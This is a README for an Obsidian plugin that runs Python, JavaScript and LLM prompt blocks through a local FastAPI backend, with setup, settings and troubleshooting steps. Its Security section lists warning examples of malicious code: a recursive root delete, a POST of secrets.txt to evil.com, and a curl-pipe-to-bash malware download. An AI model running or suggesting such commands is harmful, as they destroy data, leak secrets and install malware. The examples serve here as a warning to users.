# Code Runner for Obsidian

**Execute Python & JavaScript with full package access + ChatGPT integration.** 

Unlike sandboxed solutions, Code Runner uses a **real Python kernel** with persistent sessions and unlimited package support.

![Version](https://img.shields.io/badge/version-1.0.0-blue)
![License](https://img.shields.io/badge/license-MIT-green)

**What makes this different:**
- ✅ **Full Python** - Use pandas, scikit-learn, ANY package
- 🧠 **True Kernel** - Variables persist like Jupyter
- 🤖 **ChatGPT/Claude** - LLM blocks for AI-assisted workflows  
- 🔒 **100% Local** - Code never leaves your machine
- ⚡ **Fast** - Direct execution, no sandboxing overhead

**Perfect for:** Data scientists, ML engineers, researchers who need real Python power in their notes.

---

## ✨ Features

**Core Execution:**
- 🐍 **Python & JavaScript** - Run code blocks with a click or hotkey
- 🧠 **Kernel Mode** - Variables persist across blocks (like Jupyter)
- ⚡ **Editor Mode** - Execute with `Cmd/Ctrl+Shift+Enter`
- 📊 **Inline Output** - Results appear directly in your notes
- 💾 **Output Blocks** - Saved as markdown for version control

**AI Integration:**
- 🤖 **ChatGPT/Claude/Ollama** - Run LLM prompts as code blocks
- 🔧 **Agent Mode** - Task-oriented AI responses
- 🔐 **Secure** - Use your own API keys (stored locally)

**Developer Experience:**
- ⚙️ **Full Settings UI** - Configure everything in Obsidian
- 📜 **Error Handling** - Clear error messages
- 🎨 **Themed** - Matches your Obsidian theme

---

## 🚀 Quick Start

### 1. Install Plugin

**Manual Installation:**
1. Download `release.zip` from [Releases](https://github.com/yourusername/obsidian-code-runner/releases)
2. Extract to `.obsidian/plugins/obsidian-code-runner/`
3. Enable in Settings → Community Plugins

### 2. Start Backend

```bash
cd obsidian-code-runner/runner
pip install -r requirements.txt
python -m uvicorn main:app --host 127.0.0.1 --port 8000 --reload
```

**One-time setup. Leave it running.** Backend only accessible from your machine.

### 3. Run Code!

**In Obsidian, create a code block:**

````markdown
```python
print("Hello from Obsidian!")
```
````

**Press `Cmd/Ctrl+Shift+Enter` or switch to Reading View and click `▶ Run`**

**Output appears:**
````markdown
```output
Hello from Obsidian!
```
````

**Done!** 🎉

---

## 📖 Usage Examples

### Python with Persistent Variables

````markdown
```python
x = 42
y = 10
```

```python
print(x + y)  # Variables persist!
```

```output
52
```
````

### ChatGPT Integration

````markdown
```llm
Explain quantum entanglement in one sentence
```
````

**Configure in Settings → LLM Configuration**

---

## ⚙️ Settings

**Settings → Community Plugins → Code Runner**

| Setting | Description | Default |
|---------|-------------|---------|
| **Backend URL** | Where code executes | `http://127.0.0.1:8000/run` |
| **Kernel Mode** | Persistent Python sessions | ✅ ON |
| **Enable Python** | Python execution | ✅ ON |
| **Enable JavaScript** | JavaScript execution | ✅ ON |
| **Enable LLM** | AI prompt blocks | ❌ OFF |

**LLM Configuration (when enabled):**
- **Provider**: Auto / Ollama / OpenAI
- **API Key**: Your OpenAI key
- **Model**: Which AI model to use

---

## 🤖 AI Features Setup

### Option 1: Ollama (Local, Free, Private)

```bash
# Install Ollama
# Download from https://ollama.ai

# Pull a model
ollama pull llama2

# Run Ollama
ollama serve
```

**No API key needed!**

### Option 2: OpenAI (Cloud, Paid)

1. Get API key: [platform.openai.com/api-keys](https://platform.openai.com/api-keys)
2. Settings → Code Runner → LLM Configuration
3. Paste API key
4. Done!

---

## 🎯 How It Works

```
Your Note (Obsidian)
    ↓
Plugin sends code
    ↓
FastAPI Backend (local)
    ↓
Executes Python/JS
    ↓
Returns output
    ↓
Displayed in note
```

**Backend runs locally = your code never leaves your machine.**

---

## 🔧 Backend Details

**What it does:**
- Executes Python/JavaScript code
- Manages kernel sessions
- Calls LLM APIs

**Requirements:**
- Python 3.8+
- FastAPI, Uvicorn

**Start command:**
```bash
python -m uvicorn main:app --host 127.0.0.1 --port 8000 --reload
```

**Keep it running in the background.**

⚠️ **Security:** `127.0.0.1` means localhost only - backend not accessible from network.

---

## ⌨️ Keyboard Shortcuts

| Action | Shortcut |
|--------|----------|
| Run current code block | `Cmd/Ctrl + Shift + Enter` |

---

## 🔒 Security

### ⚠️ Important: Code Execution Risks

**Code Runner executes code with YOUR user permissions.**

**What this means:**
- ✅ Code runs locally (not on cloud servers)
- ✅ Backend only accessible from your machine (`127.0.0.1`)
- ⚠️ Code can access your files
- ⚠️ Code can make network requests
- ⚠️ Code can install packages

**This is the same risk as:**
- Running Python in your terminal
- Using Jupyter Notebook
- Executing code in VS Code

### Best Practices

✅ **DO:**
- Review code before running
- Only run code you trust
- Use dedicated Python environment (venv)
- Keep backend on `127.0.0.1` (localhost only)

❌ **DON'T:**
- Run untrusted code from internet
- Share your backend URL
- Port-forward backend to internet
- Run backend as root/admin

### Malicious Code Examples

**Don't run code like this:**
```python
# Deletes files
import os
os.system("rm -rf /")

# Exfiltrates data
import requests
requests.post("evil.com", data=open("secrets.txt"))

# Installs malware
import subprocess
subprocess.run(["curl", "evil.com/malware.sh", "|", "bash"])
```

**If you see suspicious patterns (`os.system`, `subprocess`, network requests to unknown URLs), DON'T RUN IT.**

### Future Security Features

**v1.1:**
- Dangerous code detection
- Confirmation prompts for risky operations

**v2.0:**
- Docker container execution
- File system restrictions
- Network isolation

---

## 🐛 Troubleshooting

### "Error contacting backend"

**Solution:**
```bash
# Check if backend is running
curl http://localhost:8000/health

# If not, start it
cd runner
python -m uvicorn main:app --port 8000 --reload
```

### "Module not found"

**Solution:**
```bash
# Install requirements
cd runner
pip install -r requirements.txt
```

### LLM not working

**Solution:**
1. Enable in Settings → Code Runner → Enable LLM
2. Choose provider (Ollama or OpenAI)
3. Configure API key or start Ollama

---

## 📝 Supported Languages

- ✅ **Python** (with kernel mode)
- ✅ **JavaScript** (Node.js)
- ✅ **LLM** (ChatGPT, Claude, Ollama)
- ✅ **Agent** (Task-oriented AI)

**Coming Soon:**
- Ruby, Go, Rust, SQL, Shell

---

## 🚧 Roadmap

**v1.1 (Next):**
- Clear output button
- Improved error display
- Example notebooks

**v1.2:**
- Matplotlib plots inline
- Pandas DataFrame tables
- Export to Jupyter

**v2.0:**
- Multi-language support
- Rich output (images, HTML)
- Notebook templates

---

## 💝 Support

If Code Runner saves you time, consider:

- ☕ **[Buy me a coffee](https://ko-fi.com/nathandavies)**
- ⭐ **[Star this repo](https://github.com/yourusername/obsidian-code-runner)**
- 🐛 **Report bugs** via Issues
- 💡 **Suggest features**

---

## 📄 License

MIT License - see [LICENSE](LICENSE)

**Free forever. Open source. No tracking.**

---

## 🙏 Acknowledgments

Built with:
- [Obsidian API](https://docs.obsidian.md/)
- [FastAPI](https://fastapi.tiangolo.com/)
- Love for computational notebooks ❤️

---

## 📫 Contact

- GitHub: [@yourusername](https://github.com/yourusername)
- Issues: [Report a bug](https://github.com/yourusername/obsidian-code-runner/issues)

---

**Made with ❤️ for the Obsidian community**
